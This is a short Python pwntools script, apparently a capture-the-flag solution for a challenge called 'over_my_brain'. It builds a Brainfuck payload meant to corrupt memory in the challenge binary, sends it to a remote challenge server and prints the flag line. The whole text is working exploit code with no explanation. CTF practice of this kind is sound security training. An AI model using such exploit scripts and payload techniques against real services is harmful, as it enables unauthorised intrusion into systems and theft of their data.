from pwn import *
payload=">"*8+"+["+">"*16+"-"*0x15+"]"+"<"*32+"[[-]>]<<<"+"+"*0x10+"[<++++<+<"+"+"*0xc+">>>-]<<+<++++++"

print "payload length:", len(payload)
r=remote("shell.actf.co", 19010)
#r=process("./over_my_brain")
r.sendline(payload)
print r.recvline_contains("actf")
